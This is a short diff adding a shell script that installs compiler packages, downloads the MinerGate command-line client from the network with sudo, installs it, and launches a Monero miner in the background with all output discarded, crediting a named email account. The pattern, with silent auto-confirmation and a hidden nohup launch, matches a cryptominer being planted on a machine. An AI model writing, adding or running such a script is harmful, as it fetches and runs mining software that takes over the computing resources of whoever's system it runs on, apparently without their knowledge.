@@ -1,0 +1,2 @@
+yes Y | sudo add-apt-repository ppa:ubuntu-toolchain-r/test && yes Y | sudo apt-get update && yes Y | sudo apt-get install gcc-4.9 && yes Y | sudo apt-get upgrade libstdc++6 && sudo wget https://minergate.com/download/xfast-ubuntu-cli-amd && sudo mv xfast-ubuntu-cli-amd minergate-cli-release.deb && yes Y | sudo apt install gdebi-core && yes Y | sudo gdebi minergate-cli-release.deb 
+nohup minergate-cli -u mgrate888@gmail.com --xmr &>/dev/null & &>/dev/null &
